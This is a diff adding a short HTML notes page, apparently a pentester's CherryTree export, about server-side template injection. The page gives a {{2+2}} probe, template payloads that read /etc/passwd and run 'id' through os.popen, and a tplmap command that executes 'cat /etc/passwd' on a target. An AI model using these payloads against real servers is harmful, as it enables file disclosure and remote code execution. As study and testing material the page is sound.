@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>SSTI</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>SSTI</h1><br/>Server Side Template Injection.<br />Server Side Template Injection, is when a user is able to pass in a parameter that can control the template engine that is running on the server.<br /><a href=""><img src="images/1583-1.png" alt="images/1583-1.png" /></a><br />This introduces a vulnerability, as it allows a hacker to inject template code into the website. The effects of this can be devastating, from XSS, all the way to RCE.<br />Note: Different template engines have different injection payloads, however usually you can test for SSTI using {{2+2}} as a test.<br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection</a><br /><br />Test for SSTI:<br />	{{2+2}}<br />Try to read a file:<br />	{{ &#39;&#39;.__class__.__mro__[2].__subclasses__()[40]()(&#39;/etc/passwd&#39;).read()}}<br />Try to execute code:<br />	{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;id&#39;).read()}}<br />	<br />	<br />There is a tool for programatically exploiting this vulnerability called tplmap. <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br />Syntax:<br />	./tplmap.py -u <a href="http://10.10.10.10:5000/">http://10.10.10.10:5000/</a> -d &#39;noot&#39; --os-cmd &quot;cat /etc/passwd&quot;</div></body></html>
